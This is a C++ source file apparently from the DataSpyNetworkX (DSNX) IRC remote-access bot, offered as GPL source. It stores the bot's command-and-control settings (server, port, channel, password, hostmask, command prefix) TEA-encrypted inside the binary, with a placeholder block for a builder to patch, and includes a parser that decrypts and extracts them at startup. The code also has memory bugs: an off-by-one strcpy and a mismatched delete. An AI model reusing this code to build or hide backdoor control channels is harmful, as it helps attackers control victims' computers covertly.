/* 
	DataSpyNetworkX - DataSpy2k@Hotmail.com  Copyright (C) 2001 DataSpy
	Release Source 0.4Beta.

	In no event will the author be held liable for any damages arising from the use of this code. 

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA

*/
#include <stdio.h>
#include "..\include\SettingStorage.h"
#include "..\include\globals.h"
/*
unsigned char cs_STRSettings[128] = {
    0x66, 0x74, 0x59, 0x69, 0x80, 0x4E, 0x8A, 0xCD, 0x1D, 0x16, 0xF6, 0xA4, 0x67, 0x46, 0x9F, 0x48, 
    0xD7, 0x9C, 0x7B, 0x80, 0xD4, 0xAE, 0xF8, 0xA2, 0x92, 0x6F, 0x16, 0xB2, 0xAA, 0xF2, 0x53, 0xC3, 
    0x6D, 0xFF, 0x83, 0x70, 0xD7, 0x48, 0x17, 0x07, 0x38, 0x61, 0x31, 0xAC, 0x51, 0x18, 0xFF, 0xC1, 
    0xF3, 0x43, 0x75, 0x9A, 0xDA, 0x95, 0x11, 0xF1, 0xAA, 0x29, 0xD6, 0xF5, 0xC8, 0xE6, 0xC6, 0x8C, 
    0x8D, 0x29, 0x00, 0xA4, 0x38, 0xE4, 0x9D, 0xA7, 0xE8, 0x52, 0x76, 0xE4, 0x89, 0xBB, 0x35, 0x4C, 
    0xE8, 0x22, 0xD0, 0x4A, 0xF7, 0x6C, 0x0C, 0xC8, 0x82, 0xAF, 0x2E, 0x7B, 0xCE, 0x7A, 0xA6, 0x01, 
    0x4D, 0xBD, 0x59, 0xA6, 0x1B, 0xF4, 0x77, 0x63, 0x54, 0xA8, 0xD4, 0xD3, 0x9F, 0xA4, 0x28, 0xD0, 
    0x6E, 0x85, 0x9D, 0xCD, 0x93, 0xC5, 0xE8, 0xC6, 0x01, 0xBF, 0x32, 0xBD, 0x22, 0xB4, 0xAD, 0x85, 
    } ;

	unsigned long s_SetLength = 128;unsigned long s_Key[4] = { 80150866,285456380,246437417,492713448};

*/

	//128 BYTES
	char cs_STRSettings[] = "_DSNX\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0DSNX_";
                                  //64 \0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
	unsigned long s_SetLength = 4294967294;
	unsigned long s_Key[4] = { 4294967295,4294967295,4294967295,4294967295};

//
	
void Decode(char *cDecode,unsigned long *s_Keys,long iLen)
{
	unsigned char l[8],r[8];	int i=0,z=0,iReadLen=0;
	
	while (iLen >= 8) 
	{
		iLen -= 8;
		for (i =0; i < 8; i++)
		{
			l[i] = cDecode[i + iReadLen];
		}
			TEADecrypt((unsigned long*)l,(unsigned long*)r,s_Keys);
		for (i=0; i < 8; i++)
		{
			cDecode [i + iReadLen] = r[i];
		}
		iReadLen+=8;
	}
}

SettingRetrv::SettingRetrv()
{
	// Decrypt the settings
	Decode((char*)cs_STRSettings,s_Key,s_SetLength); 

	// Define out splitting character
	char ct = 'ç';

//port channel server password hostmask prefix replytochan

	char *cTmp = strchr((char*)cs_STRSettings,ct);

	if (cTmp == NULL)  //Were screwed! nothing we can do but leave
	{
		_exit(-1);
	}

	char *Settings = cTmp + 1;	
	
	//increment search character..
	ct++;
	
	int iCount = 0,iWrite=0;

	char *cTempHolder = new char[128]; //Temp buffer

	for (;iCount < NO_SETTINGS; iCount++)
	{
		iWrite=0;		

		while (*Settings != ct)
		{
			cTempHolder[iWrite] = *Settings;
			iWrite++;
			Settings++;
		}
		
		cTempHolder[iWrite] =0;
		this->cSetting[iCount] = strcpy(new char[lstrlen(cTempHolder)],cTempHolder);

		ct++;
		Settings++;
	}
	delete cTempHolder;
}

char *SettingRetrv::GetSetting(enum GSetting iSetting) 
{ 
	if (iSetting < NO_SETTINGS && iSetting >= 0) 
	
		return cSetting[iSetting]; 
	else
		return NULL;
}

//#endif
/*
BOOL UpdateSetting(char *cSetting)
{
	return FALSE;

	/*
	
s_SetLength = 64;
iReadLen=0;
	while (s_SetLength > 8) 
	{
		s_SetLength -= 8;
		for (i =0; i < 8; i++)
		{
			l[i] = cs_STRSettings[i + iReadLen];
		}
	TEADecrypt((unsigned long*)l,(unsigned long*)r,s_Key);
		for (i=0; i < 8; i++)
		{
			cs_STRSettings[i + iReadLen] = r[i];
		}
		iReadLen+=8;
	}*
}

BOOL WriteSettings()
{
return FALSE;
}
*/
/*********************************************************************************
* TEA takes 64 bits of data in v[0] and v[1], and 128 bits of key in k[0] - k[3]. *
* The result is returned in w[0] and w[1].                                        *
* Returning the result separately makes implementation of cipher                  *
* modes other than Electronic Code Book a little bit easier.                      *
 *********************************************************************************/
/*
void TEAEncrypt (const unsigned long *const v,unsigned long *const w,const unsigned long * const k)
{
   register unsigned long       y=v[0],z=v[1],sum=0,delta=0x9E3779B9,n=128;

   while(n-->0)
      {
      y += (z << 4 ^ z >> 5) + z ^ sum + k[sum&3];
      sum += delta;
      z += (y << 4 ^ y >> 5) + y ^ sum + k[sum>>11 & 3];
      }

   w[0]=y; w[1]=z; 
}

  
/* #ifdef ENCRYPT_FOR_ME
	
//unsigned char cs_STRSettings[] = "dhjkashjkç6667èdsnxé192.168.0.1êweirdoë!ìfífhasjkldhfajlsdjllstrlen(cs_STRSettings)";
unsigned char cs_STRSettings[] = "dhjkashjkç6667èhiéunknownêpasswdë!ìtífhasjkldhfajlsdjllstrlen(cs_STRSettings)";
	s_SetLength = 78;
	int iRLen=0;
	while (s_SetLength > 8) 
	{
		s_SetLength -= 8;
		for (i =0; i < 8; i++)
		{
			l[i] = cs_STRSettings[i + iRLen];
		}
			TEAEncrypt((unsigned long*)l,(unsigned long*)r,s_Key);
		for (i=0; i < 8; i++)
		{
			cs_STRSettings[i + iRLen] = r[i];
		}
		iRLen+=8;
	}
	s_SetLength = 78;
#endif */

void TEADecrypt(const unsigned long *const v,unsigned long *const w,const unsigned long * const k)
{
   register unsigned long       y=v[0],z=v[1],
				//delta=0x9E3779B9,n=64,sum=0xC6EF3720;
				delta=0x9E3779B9,n=128,sum=delta *n;

   //* sum = delta<<5, in general sum = delta * n 

   while(n-->0)
      {
      z -= (y << 4 ^ y >> 5) + y ^ sum + k[sum>>11 & 3];
      sum -= delta;
      y -= (z << 4 ^ z >> 5) + z ^ sum + k[sum&3];
      }
   
   w[0]=y; w[1]=z; 
}
